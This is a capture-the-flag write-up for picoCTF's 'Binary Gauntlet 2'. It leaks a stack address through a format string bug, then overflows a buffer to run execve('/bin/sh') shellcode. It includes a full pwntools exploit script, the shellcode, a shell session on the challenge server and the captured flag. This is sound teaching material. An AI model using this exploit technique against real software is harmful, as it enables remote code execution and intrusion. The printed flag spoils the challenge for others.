# Binary Gauntlet 2
Category: Binary Exploitation, 50 points

## Description

> How does ASLR affect your exploit?

A binary file was attached.

## Solution

This is the follow-up for [Binary Gauntlet 1](Binary_Gauntlet_1.md).

Let's run `checksec` on the file:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_2]
└─$ checksec --file=gauntlet
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We can see that there are virtually no protections for this program. The description says that they've enabled ASLR though, which means that some addresses should get randomized.

Using Ghidra, we can check the decompiled output of the program:

```c
undefined8 main(void)

{
  char local_78 [104];
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_78,local_10);
  return 0;
}
```

The local buffer address leak from the previous challenge is gone. If we're able to find it using another method, we'll be able to replicate our exploit from the previous challenge by copying some shellcode to the local buffer and jumping to it. To leak the buffer address, we'll use a vulnerability which has existed since the first challenge but wasn't needed until now: A format string vulnerability. 

A format string vulnerability is when the program allows the user to control the first parameter to `printf`. This means that the user can provide format string specifiers such as `%x`, `%s` or `%p` and leak data from the stack. We'll want to use this vulnerability to leak the address of the local buffer, so that we can jump to it and execute our shellcode from it. 

Let's run the program in the debugger and check the address of the local buffer. But first, we'll check the disassembly and see where the buffer starts:

```assembly
   0x0000000000400701 <+122>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400705 <+126>:   add    rax,0x3e7
   0x000000000040070b <+132>:   mov    BYTE PTR [rax],0x0
   0x000000000040070e <+135>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400712 <+139>:   lea    rax,[rbp-0x70]
   0x0000000000400716 <+143>:   mov    rsi,rdx
   0x0000000000400719 <+146>:   mov    rdi,rax
   0x000000000040071c <+149>:   call   0x400550 <strcpy@plt>
```

The destination for the `strcpy` (as reflected in `rdi`) is `rbp-0x70`, so that's where the local buffer starts. Now, to the debugger. We set a breakpoint at `main`, step a few instructions ahead to that the stack frame is set up and check what's the address of our local buffer:

```
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000000000400687  →  <main+0> push rbp
$rbx   : 0x0
$rcx   : 0x00007ffff7fb1718  →  0x00007ffff7fb3b00  →  0x0000000000000000
$rdx   : 0x00007fffffffe968  →  0x00007fffffffec09  →  "LANG=en_IL"
$rsp   : 0x00007fffffffe7e0  →  0x00007fffffffe958  →  0x00007fffffffebda  →  "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet"
$rbp   : 0x00007fffffffe860  →  0x0000000000400730  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffe958  →  0x00007fffffffebda  →  "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet"
$rdi   : 0x3e8
$rip   : 0x000000000040069b  →  <main+20> call 0x400580 <malloc@plt>
$r8    : 0x0
$r9    : 0x00007ffff7fe2180  →  <_dl_fini+0> push rbp
$r10   : 0x0
$r11   : 0x0
$r12   : 0x00000000004005a0  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe7e0│+0x0000: 0x00007fffffffe958  →  0x00007fffffffebda  →  "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet"                                                                                     ← $rsp
0x00007fffffffe7e8│+0x0008: 0x0000000100000000
0x00007fffffffe7f0│+0x0010: 0x0000000000000000
0x00007fffffffe7f8│+0x0018: 0x0000000000000000
0x00007fffffffe800│+0x0020: 0x0000000000000000
0x00007fffffffe808│+0x0028: 0x0000000000000000
0x00007fffffffe810│+0x0030: 0x0000000000f0b5ff
0x00007fffffffe818│+0x0038: 0x00000000000000c2
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40068f <main+8>         mov    DWORD PTR [rbp-0x74], edi
     0x400692 <main+11>        mov    QWORD PTR [rbp-0x80], rsi
     0x400696 <main+15>        mov    edi, 0x3e8
 →   0x40069b <main+20>        call   0x400580 <malloc@plt>
   ↳    0x400580 <malloc@plt+0>   jmp    QWORD PTR [rip+0x200aaa]        # 0x601030 <malloc@got.plt>
        0x400586 <malloc@plt+6>   push   0x3
        0x40058b <malloc@plt+11>  jmp    0x400540
        0x400590 <fflush@plt+0>   jmp    QWORD PTR [rip+0x200aa2]        # 0x601038 <fflush@got.plt>
        0x400596 <fflush@plt+6>   push   0x4
        0x40059b <fflush@plt+11>  jmp    0x400540
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x00000000000003e8,
   $rsi = 0x00007fffffffe958 → 0x00007fffffffebda → "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet",
   $rdx = 0x00007fffffffe968 → 0x00007fffffffec09 → "LANG=en_IL"
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "gauntlet", stopped 0x40069b in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40069b → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>  p/x $rbp-0x70
$1 = 0x7fffffffe7f0
```

The address is `0x7fffffffe7f0`. Now, we can allow the program to continue, and when it requests us to enter a string via `fgets`, we'll enter `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.` to inspect the contents of the stack:

```
gef>  c
Continuing.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x602691.(nil).0x6026c1.0x6022a0.0x7ffff7fb1be0.0x7fffffffe958.0x100000000.(nil).(nil).(nil).(nil).0xf0b5ff.0xc2.0x1.0x40077d.(nil).
```

Looking at the values leaked back to us, we see that the sixth value is relatively near to the local buffer's address: `0x7fffffffe958`. We can calculate the difference between both values: 

```python
>>> hex(0x7fffffffe958 - 0x7fffffffe7f0)
'0x168'
```

So what this means is that if we leak the sixth value from the stack using the format string vulnerability and subtract `0x168`, we should get the runtime address of our buffer. This techniques bypasses any ASLR protection since we're using a leaked runtime address to perform the calculation. 

Here's a script to automate the exploit:

```python
# First, generate a pwntools template using the following command:
#  pwn template --host mercury.picoctf.net --port 65046 ./gauntlet

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    proc.sendline("dummy")
    proc.sendline(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset


overflow_offset = get_overflow_offset()

io = start()

shellcode = shellcraft.sh()
log.info("Shellcode:\n{}".format(shellcode))

io.sendline("%6$p")

if args.LOCAL:
    delta = 0x168
else:
    delta = 0x158

leaked_address = int(io.recvlineS(), 16)
log.info(f"Leaked address: {hex(leaked_address)}")

buffer_address = leaked_address - delta
log.info(f"Local Buffer address: {hex(buffer_address)}")

payload = fit({
     0: asm(shellcode),
     overflow_offset: p64(buffer_address)
})

log.info("Sending payload:\n{}".format(hexdump(payload)))
io.sendline(payload)

io.interactive()

```

Notice the following addition to the script:

```python
if args.LOCAL:
    delta = 0x168
else:
    delta = 0x158
``` 

This was needed since the memory layout on the server was a bit different than the one on the local setup. Therefore, after testing and verifying the full exploit locally, it was easy to run it on the server and experiment with different `delta` values until a shell popped up on the server as well.

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_2]
└─$ python3 exploit.py LOCAL
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet': pid 3138
[+] Starting local process '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet': pid 3142
[*] Process '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet' stopped with exit code -11 (SIGSEGV) (pid 3142)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_2/core.3142'
    Arch:      amd64-64-little
    RIP:       0x400727
    RSP:       0x7ffde464c0f8
    Exe:       '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet' (0x400000)
    Fault:     0x6161616161616170
[*] Overflow offset: 120
[+] Opening connection to mercury.picoctf.net on port 65046: Done
[*] Shellcode:
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
[*] Leaked address: 0x7ffefe850108
[*] Local Buffer address: 0x7ffefe84ffa0
[*] Sending payload:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  a0 ff 84 fe  fe 7f 00 00  │daab│eaab│····│····│
    00000080
[*] Switching to interactive mode
$ ls
flag.txt
gauntlet
xinet_startup.sh
$ cat flag.txt
d509e835331047d80c23c46198350638
```

The flag: `d509e835331047d80c23c46198350638`